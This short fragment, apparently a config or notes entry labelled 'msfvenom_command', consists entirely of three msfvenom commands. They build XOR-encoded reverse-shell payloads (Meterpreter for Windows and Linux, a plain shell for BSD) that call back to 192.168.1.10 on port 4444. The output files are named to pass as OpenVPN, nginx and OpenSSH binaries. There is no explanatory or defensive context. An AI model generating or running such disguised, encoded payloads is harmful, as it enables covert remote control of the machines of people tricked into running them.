msfvenom_command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x64/xor_dynamic -o openvpn_payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -e x64/xor_dynamic -o nginx_payload.elf
msfvenom -p bsd/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -e x64/xor_dynamic -o openssh_payload.elf
